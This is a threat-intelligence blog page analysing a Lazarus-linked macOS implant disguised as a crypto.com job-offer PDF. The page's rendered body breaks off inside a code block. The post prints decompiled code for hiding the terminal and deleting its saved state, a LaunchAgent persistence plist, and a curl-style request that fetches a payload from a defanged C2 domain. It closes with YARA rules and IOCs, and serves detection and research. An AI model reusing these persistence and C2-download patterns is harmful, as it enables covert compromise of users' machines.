<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Crypto Workers Wanted | ExampleSite</title><meta name=keywords content="Lazarus,Malware,RE,CTI,North Korea,macOS"><meta name=description content="An analysis of a multi-stage macOS implant which shares a large number of commonalities with Lazarus' Operation Interception."><meta name=author content="Me"><link rel=canonical href=https://examplesite.com/posts/crypto-workers-wanted/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://examplesite.com/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://examplesite.com/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://examplesite.com/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://examplesite.com/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://examplesite.com/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="Crypto Workers Wanted"><meta property="og:description" content="An analysis of a multi-stage macOS implant which shares a large number of commonalities with Lazarus' Operation Interception."><meta property="og:type" content="article"><meta property="og:url" content="https://examplesite.com/posts/crypto-workers-wanted/"><meta property="og:image" content="https://examplesite.com/posts/crypto-workers-wanted/featured.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-13T17:51:24-05:00"><meta property="article:modified_time" content="2023-05-13T17:51:24-05:00"><meta property="og:site_name" content="ExampleSite"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://examplesite.com/posts/crypto-workers-wanted/featured.png"><meta name=twitter:title content="Crypto Workers Wanted"><meta name=twitter:description content="An analysis of a multi-stage macOS implant which shares a large number of commonalities with Lazarus' Operation Interception."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://examplesite.com/posts/"},{"@type":"ListItem","position":2,"name":"Crypto Workers Wanted","item":"https://examplesite.com/posts/crypto-workers-wanted/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Crypto Workers Wanted","name":"Crypto Workers Wanted","description":"An analysis of a multi-stage macOS implant which shares a large number of commonalities with Lazarus' Operation Interception.","keywords":["Lazarus","Malware","RE","CTI","North Korea","macOS"],"articleBody":"0. Summary This post is an analysis of a previously unreported macOS implant which appears to be part of Lazarus’ “Operation In(ter)ception” that was analyzed by SentinelOne in September 2022. This particular sample was uploaded to VirusTotal on Janurary 26, 2023 and has a number of similarites to the previously analyzed example.\nThis follows several high profile and prominent campaigns by North Korean actors involving the macOS platform. The most notable being the 3CX supply-chain attack, which was found to have a macOS component (Partick Wardle did a fantastic analysis). JAMF also recently reported on some new Mac malware called RustBucket, which is also attributed to North Korean threat actors.\nThis malware is delivered under the guise of a crypto.com job posting and has at least 3 stages. It establishes persistence using a LaunchDaemon and is capable of downloading and running further malware from a C2 server.\nAll of the decompiled code, YARA rules, and Binary Ninja databases can be found on my Github.\n1. First Stage Trait Value Name CryptoComJD.zip MD5 f764c707500e7a54db9830741d3a36bf SHA-1 f2edce988fda14e3c113eb1ef020e8a7f15e371d SHA-256 a34ac35a302ceedcb86301cc1a22caeaf6a48a15b699ed20a02b5c705d6741ec The malware was delivered in a file called CryptoComJD.zip - the distribution method is unknown at this time. The PDF included in the ZIP is actually part of the first stage executable and is opened during runtime. It is 25 pages long and contains a number of crypto related job descriptions. It is the same lure that was used in the Operation In(ter)ception report. 2. Second Stage Trait Value Name CryptoComJobOpportunities.pdf MD5 d1c064a698dc3b3414313d9f9e33b73b SHA-1 331f11417b11350aef9705791ff765d232f816bf SHA-256 8762bd7e0facf8cbfa0e8710d7f2a417d43d946d22b0d7eecb3942569ce57fc0 2.1 - Preliminary Analysis Despite the name, this file is a Mach-O universal binary, which means both arm64 and x86 versions are contained in a single executable.\n➜ stage1 file sample-fat-file sample-fat-file: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit executable x86_64] [arm64:Mach-O 64-bit executable arm64] sample-fat-file (for architecture x86_64):\tMach-O 64-bit executable x86_64 sample-fat-file (for architecture arm64):\tMach-O 64-bit executable arm64 In order to more easily examine this, we can use the tool lipo to extract the build for a particular architecture:\n➜ stage1 lipo sample-fat-file -thin arm64 -output stage1-arm After binwalking extracted file we can see some other interesting things, particularly that there is a .app archive and another Mach-O included.\n➜ stage1 binwalk stage1-arm DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 1276 0x4FC Unix path: /usr/lib/dyld 33032 0x8108 gzip compressed data, from Unix, last modified: 2022-09-22 01:02:02 45151 0xB05F PDF document, version: \"1.5\" 46188 0xB46C JPEG image data, JFIF standard 1.01 48916 0xBF14 Zlib compressed data, default compression 50863 0xC6AF JPEG image data, JFIF standard 1.01 72205 0x11A0D Zlib compressed data, default compression ... ommited extra Zlip entires 706365 0xAC73D Zlib compressed data, default compression 710555 0xAD79B gzip compressed data, from Unix, last modified: 2022-09-22 00:47:49 757096 0xB8D68 XML document, version: \"1.0\" 779039 0xBE31F XML document, version: \"1.0\" 2.2 - Static Analysis Now that we have a standalone executable, we can start with static analysis. Opening up the stage1-arm file in Binary Ninja, we can see that the sample is not stripped (slay).\nFunction list:\nAddress Name 0x100002c6c int64_t ExecuteFile(int64_t arg1) 0x100002cd0 int64_t popen2(int64_t arg1, int32_t* arg2, int32_t* arg3) 0x100002e08 int64_t pclose2(int64_t arg1) 0x100002e10 int64_t Shell(int64_t arg1, int64_t arg2) 0x100002f8c void strreverse(char* arg1, int64_t arg2) 0x100002fbc void itoa(int64_t arg1, char* arg2, int32_t arg3) 0x100003054 int64_t startDaemon() 0x1000032cc int64_t IsSafariFAExist() 0x100003358 int64_t thExec() 0x100003790 char* GetUserName() 0x100003838 int64_t _main() 2.2.1 - Main The actual main function is pretty long, not because it is complex but because there is a ton of string construction going on. This is because the executable makes frequent use of bash/zsh commands through a helper method called Shell(). Main starts off by attempting to hide these commands by running a few printf statements to modify the shell window:\n_printf(\"\\x1b[3J\"); // clears the entire screen and deletes all lines saved in the scrollback buffer _printf(\"\\x1b[8;1;1t\"); // resize the terminal window to 1x1 _printf(\"\\x1b[2t\"); // minimize the window Shell(\"printf '\\x1b[8;1;1t' \u0026\u0026 printf \\'\\x1b[2t\\'\", 0); // use shell helper to again resize the window and minimize Next, a few strings are built using a series of strcats and strcpys.\na filepath: /Users/{username}/Library/DiagnosticsPeer/CryptoComJobOpportunities.pdf a bash command: open \\'{filepath}\\' \u0026\u0026 rm -rf \\'/Users/{username}/Library/Saved Application State/com.apple.Terminal.savedState\\' The embedded PDF file is written to the location above and the bash command is executed. The bash command opens the PDF and deletes the terminal history. This gives the impression that the double-clicked file is actually a PDF and not an executable.\nFILE *filepath_fp = _open(\u0026filepath, 0x201); if (filepath_fp == 0) { _write(); _close(filepath_fp); Shell(\u0026command, 0); ... Finally, thExec() and then a check against the killswitch are called. If the next stage is already found to be running, execution will stop.\n//cont... thExec(); if (IsSafariFAExist() == 1) { _g_d = 1; } Shell(\"killall Terminal\", 0); } 2.2.2 - Killswitch The function IsSafariFAExist() is a killswitch to prevent installation if the next stage is already running on the host. It uses the Shell() helper function to execute pgrep which searches for the running process diageventagent. This function is checked a few times in: main, thExec, and startDaemon. The behavior of exiting if the function returns true is consistent.\nint int_conv_of_pgrep_output; int return_val; char* outcome_of_pgrep; memset(outcome_of_pgrep, 0, 0x64); Shell(\"pgrep -f diageventagent\", \u0026outcome_of_pgrep); if (outcome_of_pgrep != 0) { int_conv_of_pgrep_output = _atoi(\u0026outcome_of_pgrep); if (int_conv_of_pgrep_output \u003e 0) { return_val = 1; } } if (((outcome_of_pgrep == 0) || (outcome_of_pgrep != 0 \u0026\u0026 int_conv_of_pgrep_output \u003c= 0)) { return_val = 0; } return return_val; 2.2.3 - thExec() This function is responsible for writing the included .app archive and subsequent executables to dist as well as triggering the persistence mechanism. Just like main it makes heavy use of Shell() and most of it’s length comes from the tedious tedious string building.\nThere are 5 main strings built:\nA source path: /Users/{username}/Library/DiagnosticsPeer/diageventagent_ A destination path: /Users/{username}/Library/DiagnosticsPeer/diageventagent A temp path: /Users/{username}/Library/DiagnosticsPeer/diagevent_ Command 1:tar zxvf \\'{temp}\\' -C \\'{dest}\\' Command 2: open -a \\'{dest}/diageventd.app\\' The core logic of this function is quite short and centers around checking against the killswitch before triggering the persistence mechanism.\nif (IsSafariFAExist() == 1) { Shell(\"killall Terminal\", 0); } else { if (IsSafariFAExist() == 0) { int32_t x0_45; // killswitch status do { Shell(\u0026command2, 0); startDaemon(); _sleep(1); _g_c = 1; // global state variable x0_45 = IsSafariFAExist(); } while (x0_45 == 0); } if (_access(\u0026dest, 0) != 0xffffffff) { _g_e = 1; // global state variable } } 2.2.4 - Persistence The startDaemon() function is how this malware establishes persistence. It does so through a LaunchAgent daemon called “iTunes_trush” (banger playlist name).\nThe general flow of this function is:\nCreate directory in /Users/{username}/Library/LaunchAgents/ Create plist file in /Users/{username}/Library/LaunchAgents/com.diagnosticspeer.plist Create filepath string for second stage executable: /Users/{username}/Library/DiagnosticsPeer/diageventagent Write second stage executable. The following is the contents of the written plist file. It is setup so that launchd will runs the executable diageventagent at system boot.\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"\u003e \u003cplist version=\"1.0\"\u003e \u003cdict\u003e \u003ckey\u003eLabel\u003c/key\u003e \u003cstring\u003eiTunes_trush\u003c/string\u003e \u003ckey\u003eOnDemand\u003c/key\u003e \u003ctrue/\u003e \u003ckey\u003eProgramArguments\u003c/key\u003e \u003carray\u003e \u003cstring\u003e/Users/{username}/Library/DiagnosticsPeer/diageventagent\u003c/string\u003e \u003c/array\u003e \u003ckey\u003eRunAtLoad\u003c/key\u003e \u003ctrue/\u003e \u003ckey\u003eKeepAlive\u003c/key\u003e \u003ctrue/\u003e \u003c/dict\u003e \u003c/plist\u003e 3. Third Stage Trait Value Name diageventagent MD5 edc8136611b90ea492830adde099b1a6 SHA-1 1104a10689f4887ea9bba47fe3e115e271414fbe SHA-256 fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 3.1 - Preliminary Analysis Again, this file is a Mach-O universal binary so we repeat the process of extracting a particular build for the purposes of analysis. I chose the ARM version for consistency.\n➜ stage2 file fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit executable x86_64] [arm64:Mach-O 64-bit executable arm64] fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 (for architecture x86_64):\tMach-O 64-bit executable x86_64 fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 (for architecture arm64):\tMach-O 64-bit executable arm64 ➜ stage2 lipo fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 -thin arm64 -output stage2-arm-sample 3.2 - Static Analysis After opening up this file in Binja we can see that it is also not stripped and shares a number of similarities with the previous stage.\nFunction list:\nAddress Name 0x100002c3c int64_t ExecuteFile(int64_t arg1) 0x100002c90 int64_t popen2(int64_t arg1, int32_t* arg2, int32_t* arg3) 0x100002dc8 int64_t pclose2(int64_t arg1) 0x100002dd0 int64_t Shell() 0x100002f58 int64_t write_data() 0x100002f5c int64_t DownloadFile() 0x10000367c void strreverse(char* arg1, int64_t arg2) 0x1000036ac void itoa(int64_t arg1, char* arg2, int32_t arg3) 0x100003744 int64_t cp() 0x1000038d0 int64_t _main() 3.2.1 - Main Shocker this main also is mostly just string building. This stage also preodically checks in with the C2 server to try and download a payload located at https[:]//capitalzeroco.com/{user's UID}.png. If the file is found, it would be written to /Users/{username}/\"/Library/DiagnosticsPeer/AppStore.\nIt then drops into the following infinite loop:\nwhile (true) x0_10 = DownloadFile() if (x0_10 != 0) break _sleep(0x4b0) if (x0_10 == 1) ExecuteFile(\u0026filepath) while (true) _sleep(0x4b0) 3.2.2 - Download File Then libcurl to build a curl command that would be equivalent to:\ncurl -X GET \"https[:]//capitalzeroco[.]com?response=\" \\ -H \"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\" \\ -H \"Content-Encoding: application/x-www-form-urlencoded; charset=UTF-8\" If there is a successful download, it would try to perform the following command using the Shell() helper:\ntar zxvf \\'{}\\' -C \\'{new file}\\'\" 4. Infrastructure Analysis The C2 domain in this sample is capitalzeroco[.]com and currently points to the domain 172[.]93[.]201[.]106. It is currently running Microsoft IIS and has RDP exposed. This means that this host is most likely a compromised asset making pivoting off this particular infra difficult.\nThe domain was registered on Porkbun which is a favorite of\n5. Appendix 5.1 - YARA Rules rule operation_intercept_macos_stage1 { meta: description = \"Detecting persistence of macOS persistence Lazarus\" author = \"@birchb0y\" reference = \"\" date = \"2023-13-05\" strings: $persist1 = \"com.diagnosticspeer.plist\" $persist2 = \"DiagnosticsPeer\" $persist3 = \"pgrep -f diageventagent\" $persist4 = \"diageventagent_\" $persist5 = \"diagevent_\" $persist6 = \"diageventagent\" $persist7 = \"diageventd.app\" $plist1 = \"iTunes_trush\" $plist2 = \"OnDemand\" $plist3 = \"RunAtLoad\" $plist4 = \"KeepAlive\" condition: any of ($persist*) or all of ($plist*) } rule operation_intercept_stage2 { meta: description = \"\" author = \"@birchb0y\" reference = \"\" date = \"2023-13-05\" strings: $string1 = \"DiagnosticsPeer\" $string2 = \"capitalzeroco.com\" $curl1 = \"Mozilla/5.0+(Macintosh;Intel+Mac+OS+X+12_4)+AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\" $curl2 = \"Content-Encoding: application/x-www-form-urlencoded; charset=UTF-8\" condition: any of ($string*) or all of ($curl*) } 5.2 - IOCs Files\nName SHA-256 CryptoComJobOpportunities.pdf 8762bd7e0facf8cbfa0e8710d7f2a417d43d946d22b0d7eecb3942569ce57fc0 diageventagent fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 CryptoComJD.zip a34ac35a302ceedcb86301cc1a22caeaf6a48a15b699ed20a02b5c705d6741ec Infrastructure\nDomain IP capitalzeroco[.]com 172[.]93[.]201[.]106 ","wordCount":"1647","inLanguage":"en","datePublished":"2023-05-13T17:51:24-05:00","dateModified":"2023-05-13T17:51:24-05:00","author":{"@type":"Person","name":"Me"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://examplesite.com/posts/crypto-workers-wanted/"},"publisher":{"@type":"Organization","name":"ExampleSite","logo":{"@type":"ImageObject","url":"https://examplesite.com/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://examplesite.com/ accesskey=h title="Home (Alt + H)"><img src=https://examplesite.com/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://examplesite.com/categories/ title=categories><span>categories</span></a></li><li><a href=https://examplesite.com/tags/ title=tags><span>tags</span></a></li><li><a href=https://example.org title=example.org><span>example.org</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://examplesite.com/>Home</a>&nbsp;»&nbsp;<a href=https://examplesite.com/posts/>Posts</a></div><h1 class=post-title>Crypto Workers Wanted</h1><div class=post-description>An analysis of a multi-stage macOS implant which shares a large number of commonalities with Lazarus' Operation Interception.</div><div class=post-meta><span title='2023-05-13 17:51:24 -0500 -0500'>May 13, 2023</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1647 words&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/crypto-workers-wanted/index.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><h2 id=0-summary>0. Summary<a hidden class=anchor aria-hidden=true href=#0-summary>#</a></h2><p>This post is an analysis of a previously unreported macOS implant which appears to be part of Lazarus&rsquo; &ldquo;Operation In(ter)ception&rdquo; that was <a href=https://www.sentinelone.com/blog/lazarus-operation-interception-targets-macos-users-dreaming-of-jobs-in-crypto/>analyzed by SentinelOne</a> in September 2022. This particular sample was uploaded to <a href=https://www.virustotal.com/gui/file/8762bd7e0facf8cbfa0e8710d7f2a417d43d946d22b0d7eecb3942569ce57fc0/relations>VirusTotal</a> on Janurary 26, 2023 and has a number of similarites to the previously analyzed example.</p><p>This follows several high profile and prominent campaigns by North Korean actors involving the macOS platform. The most notable being the <a href=https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise>3CX supply-chain</a> attack, which was found to have a macOS component (Partick Wardle did a fantastic <a href=https://objective-see.org/blog/blog_0x73.html>analysis</a>). JAMF also recently reported on some new Mac malware called <a href=https://www.jamf.com/blog/bluenoroff-apt-targets-macos-rustbucket-malware/>RustBucket</a>, which is also attributed to North Korean threat actors.</p><p>This malware is delivered under the guise of a crypto.com job posting and has at least 3 stages. It establishes persistence using a LaunchDaemon and is capable of downloading and running further malware from a C2 server.</p><p>All of the decompiled code, YARA rules, and Binary Ninja databases can be found on my <a href=https://github.com/ald3ns>Github</a>.</p><h2 id=1-first-stage>1. First Stage<a hidden class=anchor aria-hidden=true href=#1-first-stage>#</a></h2><table><thead><tr><th>Trait</th><th>Value</th></tr></thead><tbody><tr><td>Name</td><td>CryptoComJD.zip</td></tr><tr><td>MD5</td><td>f764c707500e7a54db9830741d3a36bf</td></tr><tr><td>SHA-1</td><td>f2edce988fda14e3c113eb1ef020e8a7f15e371d</td></tr><tr><td>SHA-256</td><td>a34ac35a302ceedcb86301cc1a22caeaf6a48a15b699ed20a02b5c705d6741ec</td></tr></tbody></table><p>The malware was delivered in a file called <code>CryptoComJD.zip</code> - the distribution method is unknown at this time. The PDF included in the ZIP is actually part of the first stage executable and is opened during runtime. It is 25 pages long and contains a number of crypto related job descriptions. It is the same lure that was used in the Operation In(ter)ception report.
<img loading=lazy src=img/lure-pdf.png alt=lure-pdf.png title="Fig 1: PDF Job Lure"></p><h2 id=2-second-stage>2. Second Stage<a hidden class=anchor aria-hidden=true href=#2-second-stage>#</a></h2><table><thead><tr><th>Trait</th><th>Value</th></tr></thead><tbody><tr><td>Name</td><td>CryptoComJobOpportunities.pdf</td></tr><tr><td>MD5</td><td>d1c064a698dc3b3414313d9f9e33b73b</td></tr><tr><td>SHA-1</td><td>331f11417b11350aef9705791ff765d232f816bf</td></tr><tr><td>SHA-256</td><td>8762bd7e0facf8cbfa0e8710d7f2a417d43d946d22b0d7eecb3942569ce57fc0</td></tr></tbody></table><h3 id=21---preliminary-analysis>2.1 - Preliminary Analysis<a hidden class=anchor aria-hidden=true href=#21---preliminary-analysis>#</a></h3><p>Despite the name, this file is a Mach-O universal binary, which means both arm64 and x86 versions are contained in a single executable.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  stage1 file sample-fat-file
</span></span><span class=line><span class=cl>sample-fat-file: Mach-O universal binary with <span class=m>2</span> architectures: <span class=o>[</span>x86_64:Mach-O 64-bit executable x86_64<span class=o>]</span> <span class=o>[</span>arm64:Mach-O 64-bit executable arm64<span class=o>]</span>
</span></span><span class=line><span class=cl>sample-fat-file <span class=o>(</span><span class=k>for</span> architecture x86_64<span class=o>)</span>:	Mach-O 64-bit executable x86_64
</span></span><span class=line><span class=cl>sample-fat-file <span class=o>(</span><span class=k>for</span> architecture arm64<span class=o>)</span>:	Mach-O 64-bit executable arm64
</span></span></code></pre></div><p>In order to more easily examine this, we can use the tool <code>lipo</code> to extract the build for a particular architecture:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  stage1 lipo sample-fat-file -thin arm64 -output stage1-arm
</span></span></code></pre></div><p>After binwalking extracted file we can see some other interesting things, particularly that there is a <code>.app</code> archive and another Mach-O included.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  stage1 binwalk stage1-arm
</span></span><span class=line><span class=cl>DECIMAL       HEXADECIMAL     DESCRIPTION
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------
</span></span><span class=line><span class=cl><span class=m>1276</span>          0x4FC           Unix path: /usr/lib/dyld
</span></span><span class=line><span class=cl><span class=m>33032</span>         0x8108          gzip compressed data, from Unix, last modified: 2022-09-22 01:02:02
</span></span><span class=line><span class=cl><span class=m>45151</span>         0xB05F          PDF document, version: <span class=s2>&#34;1.5&#34;</span>
</span></span><span class=line><span class=cl><span class=m>46188</span>         0xB46C          JPEG image data, JFIF standard 1.01
</span></span><span class=line><span class=cl><span class=m>48916</span>         0xBF14          Zlib compressed data, default compression
</span></span><span class=line><span class=cl><span class=m>50863</span>         0xC6AF          JPEG image data, JFIF standard 1.01
</span></span><span class=line><span class=cl><span class=m>72205</span>         0x11A0D         Zlib compressed data, default compression
</span></span><span class=line><span class=cl>... ommited extra Zlip entires
</span></span><span class=line><span class=cl><span class=m>706365</span>        0xAC73D         Zlib compressed data, default compression
</span></span><span class=line><span class=cl><span class=m>710555</span>        0xAD79B         gzip compressed data, from Unix, last modified: 2022-09-22 00:47:49
</span></span><span class=line><span class=cl><span class=m>757096</span>        0xB8D68         XML document, version: <span class=s2>&#34;1.0&#34;</span>
</span></span><span class=line><span class=cl><span class=m>779039</span>        0xBE31F         XML document, version: <span class=s2>&#34;1.0&#34;</span>
</span></span></code></pre></div><h3 id=22---static-analysis>2.2 - Static Analysis<a hidden class=anchor aria-hidden=true href=#22---static-analysis>#</a></h3><p>Now that we have a standalone executable, we can start with static analysis. Opening up the <code>stage1-arm</code> file in Binary Ninja, we can see that the sample is not stripped (slay).</p><p>Function list:</p><table><thead><tr><th>Address</th><th>Name</th></tr></thead><tbody><tr><td>0x100002c6c</td><td>int64_t ExecuteFile(int64_t arg1)</td></tr><tr><td>0x100002cd0</td><td>int64_t popen2(int64_t arg1, int32_t* arg2, int32_t* arg3)</td></tr><tr><td>0x100002e08</td><td>int64_t pclose2(int64_t arg1)</td></tr><tr><td>0x100002e10</td><td>int64_t Shell(int64_t arg1, int64_t arg2)</td></tr><tr><td>0x100002f8c</td><td>void strreverse(char* arg1, int64_t arg2)</td></tr><tr><td>0x100002fbc</td><td>void itoa(int64_t arg1, char* arg2, int32_t arg3)</td></tr><tr><td>0x100003054</td><td>int64_t startDaemon()</td></tr><tr><td>0x1000032cc</td><td>int64_t IsSafariFAExist()</td></tr><tr><td>0x100003358</td><td>int64_t thExec()</td></tr><tr><td>0x100003790</td><td>char* GetUserName()</td></tr><tr><td>0x100003838</td><td>int64_t _main()</td></tr></tbody></table><h4 id=221---main>2.2.1 - Main<a hidden class=anchor aria-hidden=true href=#221---main>#</a></h4><p>The actual main function is pretty long, not because it is complex but because there is a ton of string construction going on. This is because the executable makes frequent use of bash/zsh commands through a helper method called <code>Shell()</code>. Main starts off by attempting to hide these commands by running a few <code>printf</code> statements to modify the shell window:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>_printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\x1b</span><span class=s>[3J&#34;</span><span class=p>);</span> <span class=c1>// clears the entire screen and deletes all lines saved in the scrollback buffer
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>_printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\x1b</span><span class=s>[8;1;1t&#34;</span><span class=p>);</span> <span class=c1>// resize the terminal window to 1x1
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>_printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\x1b</span><span class=s>[2t&#34;</span><span class=p>);</span> <span class=c1>// minimize the window
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>Shell</span><span class=p>(</span><span class=s>&#34;printf &#39;</span><span class=se>\x1b</span><span class=s>[8;1;1t&#39; &amp;&amp; printf </span><span class=se>\&#39;\x1b</span><span class=s>[2t</span><span class=se>\&#39;</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span> <span class=c1>// use shell helper to again resize the window and minimize
</span></span></span></code></pre></div><p>Next, a few strings are built using a series of <code>strcats</code> and <code>strcpys</code>.</p><ol><li>a filepath:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/Users/<span class=o>{</span>username<span class=o>}</span>/Library/DiagnosticsPeer/CryptoComJobOpportunities.pdf
</span></span></code></pre></div><ol start=2><li>a bash command:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>open <span class=se>\&#39;</span><span class=o>{</span>filepath<span class=o>}</span><span class=se>\&#39;</span> <span class=o>&amp;&amp;</span> rm -rf <span class=se>\&#39;</span>/Users/<span class=o>{</span>username<span class=o>}</span>/Library/Saved Application State/com.apple.Terminal.savedState<span class=se>\&#39;</span>
</span></span></code></pre></div><p>The embedded PDF file is written to the location above and the bash command is executed. The bash command opens the PDF and deletes the terminal history. This gives the impression that the double-clicked file is actually a PDF and not an executable.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>FILE</span> <span class=o>*</span><span class=n>filepath_fp</span> <span class=o>=</span> <span class=nf>_open</span><span class=p>(</span><span class=o>&amp;</span><span class=n>filepath</span><span class=p>,</span> <span class=mh>0x201</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>filepath_fp</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>_write</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nf>_close</span><span class=p>(</span><span class=n>filepath_fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>Shell</span><span class=p>(</span><span class=o>&amp;</span><span class=n>command</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>...</span>
